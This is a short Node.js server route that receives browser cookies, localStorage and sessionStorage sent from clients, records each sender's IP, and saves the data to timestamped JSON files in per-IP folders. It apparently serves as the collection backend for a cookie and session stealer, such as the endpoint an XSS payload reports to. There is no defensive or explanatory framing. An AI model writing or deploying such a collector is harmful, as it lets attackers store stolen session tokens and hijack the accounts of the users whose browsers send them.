const {valid} = require('sandhands')
const {writeFile} = require('fs')
const {resolve, join} = require('path')
const ensureExists = require('../../functions/ensureExists')

const ipRegex = /^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/

const dataFolder = resolve(__dirname, '../data')

const bodyFormat = {
  localStorage: {_:{}, strict: false},
  cookies: {_: String, minLength: 0},
  sessionStorage: {_:{}, strict: false}
}

function storage(request, reply) {
  reply.send()
  if (!valid(request.body, bodyFormat)) return

  const {localStorage, cookies, sessionStorage} = request.body

  let ip = request.headers["X-Forwarded-For"]

  if (ip) {
    if (!ipRegex.test(ip)) return console.log(new Error('Malformed IP: "'+ip+'"!'))
  } else {
    ip = "unknown"
    console.warn(new Error('Missing X-Forwarded-For Header!'))
  }

  const output = {localStorage, cookies, sessionStorage}; // Required Semicolon

  ["localStorage", "sessionStorage"].forEach(storageLocationName => {
    const storageLocation = output[storageLocationName]
    const entries = Object.entries(storageLocation)
    let anyValid = false
    for (let i = 0; i < entries.length; i++) {
      const [key, value] = entries[i]
      if (typeof value != 'string' || value.length < 1) {
        delete storageLocation[key]
      } else {
        if (anyValid === false) anyValid = true
      }
    }

    if (anyValid === false) delete output[storageLocationName]
  })

  if (cookies.length < 1) delete output.cookies

  if (Object.keys(output).length < 1) return

  const date = new Date()

  const dateString = date.getDate() + "-" + (date.getMonth() + 1) + "-" + date.getFullYear() + " " + date.getHours() + ":" + date.getMinutes() + ":" + date.getSeconds()

  const fileName = dateString + '.json'

  const ipFolder = join(dataFolder, ip.replace(/\./g, '-'))

  const storageFolder = join(ipFolder, '/storage')

  ensureExists(ipFolder, err => {
    if (err) return console.log(err)
    ensureExists(storageFolder, err => {
      if (err) return console.log(err)
      try {
        writeFile(storageFolder + '/' + fileName, JSON.stringify(output), err => {
          if (err) console.log(err)
        })
      } catch(error) {
        console.log(error)
      }
    })
  })

}

module.exports = storage
